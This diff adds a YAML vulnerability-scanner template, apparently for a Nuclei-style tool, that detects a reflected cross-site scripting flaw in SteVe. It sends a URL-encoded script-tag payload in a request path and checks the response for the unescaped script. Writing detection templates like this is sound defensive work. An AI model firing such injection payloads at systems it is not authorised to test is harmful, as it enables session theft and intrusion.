@@ -1,0 +1,33 @@
+id: "steve-xss"
+name: "SteVe - Cross-Site Scripting"
+severity: "medium"
+description: "SteVe contains a cross-site scripting vulnerability. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks."
+tech:
+  - "generic"
+tags:
+  - "steve"
+  - "xss"
+  - "oss"
+  - "vuln"
+cwe: "CWE-80"
+reference: "https://github.com/steve-community/steve"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/steve/services/\"%3E%3Cscript%3Ealert(document.domain)%3C/script%3E/services/"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "word"
+    part: "body"
+    words:
+      - "<script>alert(document.domain)</script>/services/?stylesheet=1\">"
+  - type: "word"
+    part: "header"
+    words:
+      - "text/html"
+  - type: "status"
+    status:
+      - 200
